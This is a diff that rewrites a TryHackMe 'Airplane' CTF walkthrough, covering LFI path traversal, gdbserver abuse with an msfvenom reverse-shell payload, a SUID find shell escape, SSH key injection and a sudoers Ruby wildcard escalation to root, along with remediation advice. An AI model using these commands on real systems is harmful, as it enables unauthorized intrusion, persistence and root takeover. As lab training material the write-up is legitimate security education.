@@ -1,325 +1,238 @@
-# TryHackMe AIRPLANE 
+# Airplane: Complete TryHackMe Walkthrough
 
-in this room i will try to do my first black box ctf and show you the process in the way:
+Official room: https://tryhackme.com/room/airplane
 
-## 1 . RECON
+## Room Overview & Information
 
-*   as always i will start by doing recon so to do recon i will use nmap and try to identify what is running behind the website and the version of the services :
-    
+**Difficulty:** Medium  
+**Category:** Linux exploitation, local file inclusion, remote debugging service abuse, privilege escalation  
+**Key concepts:** Nmap, hostname mapping, path traversal/LFI, Linux procfs, GDB server exposure, SUID ownership, sudoers wildcard abuse.
 
-### 1.1 PORT Scan
+This write-up describes the intended chain from the author's recorded room instance. Machine IPs and process IDs change between deployments. Replace every occurrence of MACHINE_IP with the currently assigned address and verify every result before proceeding.
 
-```plaintext
-nmap -sV -T4 10.82.186.120
+## Phase 1: Reconnaissance & Enumeration
+
+### 1. Start the machine and scan all TCP ports
+
+```bash
+nmap -T4 -n -sC -sV -Pn -p- -oN airplane-full.txt MACHINE_IP
 ```
 
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/d3cd927e-f951-42b2-93c2-b021fe3839d5.png align="center")
+- `-T4` uses a faster timing template.
+- `-n` disables DNS lookups.
+- `-sC` runs Nmap's default scripts.
+- `-sV` probes for service/version information.
+- `-Pn` skips host discovery and scans as though the host is online.
+- `-p-` scans TCP ports 1 through 65535.
+- `-oN` saves a readable report.
 
-*   to be sure and not to misss an open port i did another advanced nmap scan :
-    
+The recorded instance exposes TCP 22 (SSH), 6048 (unusual remote debugging service), and 8000 (HTTP). The web service identifies Werkzeug/Python and redirects to the hostname `airplane.thm`.
 
-```plaintext
-nmap -sV -sC -p- -T4 10.82.186.120
+### 2. Map the hostname
+
+Add the current target IP to the local hosts file if the lab redirects to `airplane.thm`:
+
+```bash
+echo "MACHINE_IP airplane.thm" | sudo tee -a /etc/hosts
+getent hosts airplane.thm
 ```
 
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/aea39458-94d0-48c0-bddd-ff26cf459030.png align="center")
+The second command verifies the mapping. Do not paste an old room IP into the file; it will become stale when the machine is redeployed.
 
-open ports :
+### 3. Inspect the web application
 
-*   22 / tcp ssh
-    
-*   8000/tcp http (http.server)
-    
-*   6048/tcp x11(uknown service)
-    
+Open `http://airplane.thm:8000/`. The page parameter in the redirect is an important clue:
 
-I will continue tge recon specifically on port 8000:
-
-1.  Web Server Technology (airplane.thm:8000) Service / Software: `Werkzeug httpd 3.0.2 running on Python 3.8.10.`
-    
-
-*   Server Header: Werkzeug/3.0.2 Python/3.8.10 confirms that port 8000 is running a `Python-based web application`
-    
-
-2\. Redirection & Hostname Requirements http-title: Did not follow redirect to `http://airplane.thm:8000/?page=index.html`
-
-Key Takeaways:
-
-Hostname Mapping (/etc/hosts): The server explicitly redirects to airplane.thm. This tells us that airplane.thm must be mapped to 10.82.162.35 in my local /etc/hosts file for the web app to load correctly in a browser.
-
-Entry Parameter: The redirect lands directly on ?page=index.html. This instantly highlights the page query parameter as the primary entry point to test for Local File Inclusion (LFI) or Path Traversal.
-
-what is LFI?
-
-*   **LFI (Local File Inclusion)** is a web vulnerability that occurs when an application includes or reads files from the local server without properly sanitizing or validating user input.
-    
-    Instead of serving intended files (like `about.html`), the application allows an attacker to manipulate file paths and read sensitive files on the operating system.
-    
-
-but first before taking the long way lets take a look the website and also lets use gobuster if i can find a hidden directory :
-
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/ee9c27aa-972d-41c9-b09a-79983da19ca4.png align="center")
-
-this is the website the ip get us :
-
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/26f3a0eb-c680-40ff-9083-232a7a553c54.png align="center")
-
-there is one hidden directory called `airplane` so lets check that first
-
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/0af330f7-32c3-4694-873e-ae8160c48760.png align="center")
-
-in this case there is nothing only a flothing note that says LETS FLY , so we have to go the long way and use LFI:
-
-### 1.2 Web Enumeration & LFI Discovery
-
-Navigating to `10.82.186.120http://:8000/` revealed a web application utilizing a URL parameter for page rendering:
-
-```plaintext
-http://10.82.186.120:8000/?page=index.html
+```bash
+curl -i 'http://airplane.thm:8000/?page=index.html'
 ```
 
-so lets test and confirm if the LFI theory is right :
+The `-i` option includes response headers. Next, test whether the parameter can read a known, non-secret system file:
 
-```plaintext
-curl "http://10.82.186.120:8000/?page=../../../../etc/passwd"
+```bash
+curl -sG --data-urlencode 'page=../../../../etc/passwd' 'http://airplane.thm:8000/'
 ```
 
-### **Outcome**
+- `-s` suppresses curl's progress meter.
+- `-G` puts supplied data into the query string.
+- `--data-urlencode` encodes the parameter value correctly.
 
-The request successfully returned the contents of `/etc/passwd`, confirming an unsanitized **Local File Inclusion (LFI)** vulnerability.
+When the response contains the local account database, this confirms an unsanitized local file inclusion/path traversal issue. The vulnerable parameter is being used to choose server-side content without restricting the path.
 
-### 1.3 Process Enumeration via `/proc`
+### 4. Identify the process bound to TCP 6048
 
-*   Because Port 6048 returned an ambiguous service response during the Nmap scan, the Linux `/proc` virtual filesystem was targeted via LFI to identify the process bound to that port.
-    
+The service scan cannot positively identify the service on 6048. Linux process command lines may be exposed through procfs at `/proc/PID/cmdline`. The LFI can be used to read candidate command lines. Create a local PID list:
 
-\--- On Linux systems, process command lines are stored in `/proc/[PID]/cmdline`.
-
-*   on this step i will use a tool called ffuf to FUZZ the PIDs and to try 1 up to 1000 in this case i need a list that got 1 through 1000:
-    
-
-```plaintext
+```bash
 seq 1 2000 > pids.txt
 ```
 
-after that lets use fuff:
+Then use ffuf to substitute PID candidates into the path:
 
-```plaintext
-ffuf -w pids.txt -u "http://airplane.thm:8000/?page=../../../../proc/FUZZ/cmdline" -fs 14
+```bash
+ffuf -w pids.txt -u 'http://airplane.thm:8000/?page=../../../../proc/FUZZ/cmdline' -fs 14
 ```
 
-in this case i get every on services
+- `-w` names the wordlist.
+- `-u` specifies the request URL.
+- `FUZZ` is the substitution marker.
+- `-fs 14` filters responses with the known 14-byte baseline length; confirm this baseline for the current target instead of assuming it is universal.
 
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/5bc98084-813c-40d6-9a35-6b5ad0fbbd68.png align="center")
+A process command line containing `gdbserver 0.0.0.0:6048` identifies the service listening on the unusual port. Process IDs can change, so the recorded PID 527 is an example from the prior instance, not a guaranteed answer for future deployments.
 
-there are a lot of like dosens of pids so i need to specify where the 6048 is running from so i will use another command:
+## Phase 2: Vulnerability Analysis & Initial Access
 
-```python
-for pid in $(cat valid_pids.txt); do 
-  curl -s "http://10.82.186.120:8000/?      page=../../../../proc/$pid/cmdline" | grep "6048" && echo " Found    on PID $pid"
-done
+### 5. Understand the exposed GDB server
+
+GDB server supports remote debugging. If exposed to an untrusted network without authentication, it can allow a remote debugger to upload and execute a binary. This is not normal public application functionality and is a severe configuration error.
+
+The recorded chain uses an x86-64 Linux ELF reverse-shell payload. Confirm the attacker VPN interface first; use the address assigned to the AttackBox or VPN, not an unrelated LAN address.
+
+```bash
+ip addr
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_TUN0 LPORT=4444 PrependFork=true -f elf -o shell.elf
+chmod +x shell.elf
+file shell.elf
 ```
 
-output:
+- `LHOST` is the attack host address reachable from the lab machine.
+- `LPORT` is the listener port.
+- `PrependFork=true` adds a fork behaviour used by this GDB-server exploitation method.
+- `-f elf` selects ELF binary output.
+- `-o shell.elf` names the output file.
+- `chmod +x` marks the file executable.
+- `file` confirms the output architecture and format.
 
-```shell
- /usr/bin/gdbserver0.0.0.0:6048/opt/app Found on PID 527
+Run this only in the room. A reverse shell payload is executable code; do not upload or execute it on a system outside the authorized target.
+
+### 6. Start a listener and connect through GDB
+
+In a second terminal, listen for the callback:
+
+```bash
+nc -lvnp 4444
 ```
 
-**GDB Server (**`gdbserver`**)** is a lightweight program designed for remote debugging in C, C++, and other compiled languages. It allows developers to debug an application running on a target device (like an embedded system, server, or container) from a separate host machine using the standard GNU Debugger (**GDB**).
+Open the local payload using GDB (or gdb-multiarch where required by the analysis environment):
 
-`gdbserver` is essentially a remote debugging backdoor if left exposed to the network without authentication. Because its normal job is to allow developers to inspect and manipulate processes remotely, an attacker can abuse that intended functionality to achieve **Remote Code Execution (RCE)**.
-
-*   the next step will be to use the gdb server to get remote access
-    
-
-## 2\. **Initial Access / Exploitation**
-
-*   The GNU Debugger (GDB) and `gdbserver` are designed specifically to work with binary executables.
-    
-
-so lets Generate an ELF shellcode payload matching the architecture of the target system (Linux x64) using `msfvenom`
-
-```shell
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.192.4  LPORT=4444 -f elf -o shell.elf
-```
-
-at the same time i start netcat on another tab to listen incoming signals
-
-```shell
-nc -lnvp 4444
-```
-
-the last step is to trigger the payload manually via stadard gdm command :
-
-```python
-#Launch gdb on your local machine:
+```text
 gdb shell.elf
-#Connect to the remote target process:
-(gdb) target remote 10.82.186.120 :6048
-#Upload and execute the payload on the remote host:
+(gdb) set architecture i386:x86-64
+(gdb) target extended-remote MACHINE_IP:6048
 (gdb) remote put shell.elf /tmp/shell.elf
 (gdb) set remote exec-file /tmp/shell.elf
 (gdb) run
 ```
 
-once the gdb excuted the netcat listener receives a reverse connection as user hudson:
+- `target extended-remote` selects GDB's extended remote protocol, which supports operations such as remote file transfer and starting the remote executable.
+- `remote put` copies the local payload to the specified remote path.
+- `set remote exec-file` chooses the remote executable.
+- `run` starts it under the remote debugger.
 
-```python
-❯ nc -lnvp 4444
-Listening on 0.0.0.0 4444
-Connection received on 10.82.186.120 37828
-id
-uid=1001(hudson) gid=1001(hudson) groups=1001(hudson)
+A callback should arrive at the listener if the address, port, architecture, and network path are correct. Verify the identity before claiming success:
+
+```bash
 whoami
-hudson
+id
+hostname
+pwd
+```
 
+The initial shell in the recorded instance runs as `hudson`, not root. For a more usable shell, if Python is installed:
+
+```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-hudson@airplane:/opt$ ls -la /opt
-total 24
-drwxr-xr-x  3 root root 4096 May 24  2024 .
-drwxr-xr-x 20 root root 4096 May 24  2024 ..
--rwxr-xr-x  1 root root 8384 May 24  2024 airplane
 ```
 
-*   **Initial User Context**: The reverse shell landed as user `hudson` (`uid=1001`).
-    
-*   **Shell Upgrading**: Upgraded the basic `/bin/sh` shell to a fully interactive TTY using Python's `pty` module (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).
-    
-*   **Initial Target Inspection**: Checking `/opt` revealed the binary `/opt/airplane` which turned out to be an executable file rather than a directory.
-    
+## Phase 3: Privilege Escalation & Post-Exploitation
 
-**SUID Enumeration & Exploitation (**`carlos`**)**:
+### 7. Find the SUID anomaly
 
-Enumerating SUID binaries across the host revealed that `/usr/bin/find` had custom permissions set, owned by user `carlos` rather than `root` (`-rwsr-xr-x 1 carlos carlos`).
+Search for SUID executables:
 
-When a binary has SUID set (`s` in the permission bit), the kernel executes the binary with the privileges of the **file owner** (`carlos`), not the person calling it (`hudson`).
+```bash
+find / -perm -4000 -type f 2>/dev/null
+ls -l /usr/bin/find
+```
 
-```python
-hudson@airplane:~$ find / -perm -4000 -type f 2>/dev/null
-/usr/bin/find
-/usr/bin/sudo
-/usr/bin/pkexec
-...
+The notable binary in this instance is `/usr/bin/find`, owned by `carlos` with SUID set. SUID means the process's effective UID becomes the file owner's UID when executed. This is dangerous because find can launch another program through its `-exec` feature.
 
-hudson@airplane:~$ ls -la /usr/bin/find
--rwsr-xr-x 1 carlos carlos 320160 Feb 18  2020 /usr/bin/find
-#Executing find with the -exec flag and preserve-privileges option (-p) allowed spawning a subshell inheriting carlos's effective user ID (euid=1000):
-hudson@airplane:~$ /usr/bin/find . -exec /bin/bash -p \; -quit
-#The -p (preserve privileges) flag tells bash not to drop its effective user ID back to hudson, granting you an interactive shell operating as carlos.
-bash-5.0$ id
-uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
+In the lab, the following command launches Bash while preserving the effective UID:
 
-bash-5.0$ cat /home/carlos/user.txt
+```bash
+/usr/bin/find . -exec /bin/bash -p \; -quit
+id
+cat /home/carlos/user.txt
+```
+
+The `-p` option tells Bash to preserve its privileged effective identity. The identity output should show the effective user as carlos. The user flag from the recorded instance is:
+
+```text
 eebfca2ca5a2b8a56c46c781aeea7562
 ```
 
-so in this case we found the <mark class="bg-yellow-200 dark:bg-yellow-500/30">first flag </mark> : user.txt..`eebfca2ca5a2b8a56c46c781aeea7562`
+### 8. Establish a clean Carlos session
 
-## final stage: Privilege Escalation
+The SUID shell can have a real UID of hudson and an effective UID of carlos. This distinction matters: some programs, including sudo, make decisions using more than one UID. If the room requires a normal Carlos login, create a temporary lab-only SSH key pair locally and add only its public key to Carlos's authorized_keys using the elevated shell. Do not reuse or publish a personal SSH key. Remove the temporary key and authorized_keys entry when finished if the lab permits cleanup.
 
-in this case lets upgrade to clean tty shell as carlos:
+Verify the new SSH session:
 
-Right now, i am running in a subshell spawned by `find`. For a smoother workflow, SSH directly into the machine as `carlos` using the SSH key i will injected into `/home/carlos/.ssh/authorized_keys`,
-
-Step 1: Key Injection & Permissions (On the Target Machine)
-
-```shell
- # Executed on the target server via the existing shell
-mkdir -p /home/carlos/.ssh
-chmod 700 /home/carlos/.ssh
-echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOUODd65PArq3GYK2J88yTGa7c5AWn+jrO9lu+Jl+9q8 abrham@archlinux" > /home/carlos/.ssh/authorized_keys
-chmod 600 /home/carlos/.ssh/authorized_keys
+```bash
+ssh carlos@MACHINE_IP
+id
+sudo -l
 ```
 
-Step 2: Establishing the Direct SSH Connection
+The recorded sudo policy permits Carlos to run Ruby as root for Ruby scripts matching the root-directory wildcard:
 
-Finally, show the command run from my local terminal to establish the persistent interactive shell:
-
-```shell
-❯ ssh carlos@10.82.186.120
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to "store now, decrypt later" attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
-Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
-
-Expanded Security Maintenance for Infrastructure is not enabled.
-
-0 updates can be applied immediately.
-
-Enable ESM Infra to receive additional future security updates.
-See https://ubuntu.com/esm or run: sudo pro status
-
-Your Hardware Enablement Stack (HWE) is supported until April 2025.
-
-The programs included with the Ubuntu system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-applicable law.
-
-carlos@airplane:~$ ls
-Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
-carlos@airplane:~$ cat user.txt
-eebfca2ca5a2b8a56c46c781aeea7562
-carlos@airplane:~$ nano cat
-carlos@airplane:~$ sudo -l
-Matching Defaults entries for carlos on airplane:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User carlos may run the following commands on airplane:
-    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
+```text
+(ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
 ```
 
-step 3: Privilege Escalation to Root
+This wildcard rule is too broad because it does not safely constrain the canonical path of the Ruby script.
 
-After establishing access as `carlos`, inspecting user privileges with `sudo -l` revealed a permissive `NOPASSWD` entry for the Ruby interpreter:
+### 9. Exploit the sudoers wildcard in the lab
 
-```shell
-Matching Defaults entries for carlos on airplane:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+Create a harmless Ruby script in a writable temporary directory:
 
-User carlos may run the following commands on airplane:
-    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
+```bash
+printf '%s\n' 'exec "/bin/bash"' > /tmp/shell.rb
+cat /tmp/shell.rb
 ```
 
-#### Vulnerability Analysis
+The command runs Ruby's exec method to replace the interpreter process with Bash. The sudoers rule's wildcard can be abused with a path containing a parent-directory traversal:
 
-*   The configuration permits `carlos` to execute any Ruby script residing in `/root/` with `root` permissions. However, because the rule uses a wildcard (`*.rb`) without enforcing canonical path checks, it is vulnerable to **Directory Traversal** (`../`).
-    
-
-Exploitation & Shell Access
-
-*   Created a malicious Ruby script in the world-writable `/tmp` directory containing a shell execution instruction:
-    
-*   **How It Works**: The command tells the Ruby interpreter to run `exec "/bin/bash"`, which replaces the running Ruby process with an interactive Bash shell.
-    
-
-```shell
-echo 'exec "/bin/bash"' > /tmp/shell.rb
-```
-
-*   Invoked `sudo` using a relative path to satisfy the `/root/*.rb` pattern requirement while executing our `/tmp/shell.rb` file:
-    
-
-```shell
+```bash
 sudo /usr/bin/ruby /root/../tmp/shell.rb
+id
+cat /root/root.txt
 ```
 
-```shell
-carlos@airplane:~$ echo 'exec "/bin/bash"' > /tmp/shell.rb
-carlos@airplane:~$ sudo /usr/bin/ruby /root/../tmp/shell.rb
-root@airplane:/home/carlos# ls
-cat  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
-root@airplane:/home/carlos# cat /root/root.txt
+This relies on the specific vulnerable sudoers pattern in the room. Do not generalize it as a universal sudo bypass; sudo versions and policy matching rules matter. In the recorded instance, the root flag is:
+
+```text
 190dcbeb688ce5fe029f26a1e5fce002
 ```
 
-finally i found the second flag: <mark class="bg-yellow-200 dark:bg-yellow-500/30">root.txt </mark> `190dcbeb688ce5fe029f26a1e5fce002`
+## Phase 4: Room Questions & Flags Walkthrough
 
-> Thank you for reading!
+| Question or objective | Evidence / answer from the recorded instance |
+|---|---|
+| Identify the web application | Werkzeug/Python on TCP 8000 |
+| Determine why TCP 6048 matters | Procfs command line identifies gdbserver |
+| Obtain initial access | GDB-server misuse yields hudson shell |
+| Obtain user flag | `/home/carlos/user.txt`: `eebfca2ca5a2b8a56c46c781aeea7562` |
+| Obtain root flag | Ruby sudoers wildcard issue yields root; `/root/root.txt`: `190dcbeb688ce5fe029f26a1e5fce002` |
+
+Machine-specific values such as PID, target IP, and the exact command-line output must be verified from the active instance.
+
+## Phase 5: Key Takeaways & Remediation
+
+- Do not expose a remote debugger to untrusted networks. Bind it to loopback, firewall the port, and require authenticated access.
+- Never let a user-controlled path choose arbitrary local files. Canonicalize and allowlist file names and serve fixed resources.
+- Audit SUID files and remove the SUID bit from general-purpose tools such as find unless a tightly justified requirement exists.
+- Avoid sudoers wildcard rules over privileged script paths. Permit a specific root-owned script with fixed arguments and strict permissions.
+- Treat persistence changes such as adding SSH keys as temporary lab actions; clean up after the assessment.
+- Validate each privilege transition with `id` and preserve evidence.
+
+The chain is important because each weakness crosses a different trust boundary: file read, remote debug execution, SUID identity transition, then unsafe sudo authorization. Fix each boundary independently.
